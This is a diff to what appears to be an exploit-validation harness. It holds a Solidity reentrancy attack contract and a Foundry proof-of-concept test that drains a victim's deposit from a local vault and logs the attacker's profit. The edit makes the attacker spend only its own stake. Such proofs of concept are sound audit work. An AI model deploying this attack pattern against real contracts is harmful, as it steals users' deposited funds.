@@ -27,10 +27,10 @@ _REENTER = """
 contract Reenter {
     address public target; bytes public recall; uint256 public left;
     constructor(address t) { target = t; }
-    function run() external payable {
+    function run() external {
         left = 5;
         recall = abi.encodeWithSignature("withdraw()");
-        target.call{value: msg.value}(abi.encodeWithSignature("deposit()"));
+        target.call{value: address(this).balance}(abi.encodeWithSignature("deposit()"));
         (bool ok, ) = target.call(recall);
         require(ok || address(this).balance > 0, "no entry");
     }
@@ -74,9 +74,9 @@ contract PoC is Test {
         vm.deal(victim, 10 ether);
         vm.prank(victim); v.deposit{value: 10 ether}();
         Reenter att = new Reenter(address(v));
-        vm.deal(address(att), 1 ether);
+        vm.deal(address(att), 1 ether);              // the attacker's OWN stake, nothing injected after
         uint256 bef = address(att).balance;
-        att.run{value: 1 ether}();
+        att.run();
         uint256 aft = address(att).balance;
         int256 profit = int256(aft) - int256(bef);
         console2.log("CHAIN_PROFIT_WEI", profit);
